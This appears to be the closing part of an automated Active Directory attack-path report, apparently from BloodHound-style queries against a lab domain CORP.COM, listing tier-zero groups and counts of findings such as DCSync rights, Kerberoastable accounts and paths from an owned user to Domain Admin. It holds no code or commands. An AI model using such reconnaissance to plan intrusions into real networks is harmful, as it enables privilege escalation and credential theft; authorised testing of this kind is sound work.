| Target | Type | Description |
| --- | --- | --- |
| CORP.COM | ['Base', 'Domain', 'Tag_Tier_Zero'] |  |
| ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain user and group accounts |
| ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Administrators have complete and unrestricted access to the computer/domain |
| BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Backup Operators can override security restrictions for the sole purpose of backing up or restoring files |
| DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Designated administrators of the domain |
| DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | All domain controllers in the domain |
| ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Designated administrators of the enterprise |
| PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer printers installed on domain controllers |
| SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain servers |

---

## Summary

| Metric | Count |
| ------ | ----- |
| Total Queries | 74 |
| With Results | 32 |
| No Results | 28 |
| Skipped | 14 |
| Failed | 0 |

### Key Findings

- **WriteDacl Abuse Paths**: 69 results (Privilege Escalation)
- **WriteOwner Abuse Paths**: 69 results (Privilege Escalation)
- **Owns Relationships on Users/Groups**: 28 results (Privilege Escalation)
- **GenericAll on High-Value Targets**: 26 results (Privilege Escalation)
- **High-Value Target Summary**: 9 results (Operational)
- **Shortest Path to Domain Admins**: 7 results (Attack Chains)
- **DCSync Rights**: 6 results (Privilege Escalation)
- **Full Attack Path: Owned User -> Pivot -> DA**: 6 results (Attack Chains)
- **Credential Harvest Opportunities**: 6 results (Attack Chains)
- **RDP Access Targets**: 5 results (Lateral Movement)
- **Non-DA Users with Local Admin on Workstations**: 4 results (Lateral Movement)
- **All Paths to Domain Admin (Multi-Hop)**: 4 results (Attack Chains)
- **All Domain Admins**: 3 results (Privilege Escalation)
- **Kerberoastable Service Accounts**: 2 results (Quick Wins)
- **All Local Admins per Computer**: 2 results (Lateral Movement)
- **PSRemote Access (Evil-WinRM Targets)**: 2 results (Lateral Movement)
- **AS-REP Roastable Users**: 1 results (Quick Wins)
- **High-Value Kerberoastable (Privileged + SPN)**: 1 results (Quick Wins)
- **Unconstrained Delegation Systems**: 1 results (Quick Wins)
- **Coercion Targets (Unconstrained Delegation)**: 1 results (Lateral Movement)
- **AS-REP Targets from Owned Context**: 1 results (Owned Principal)
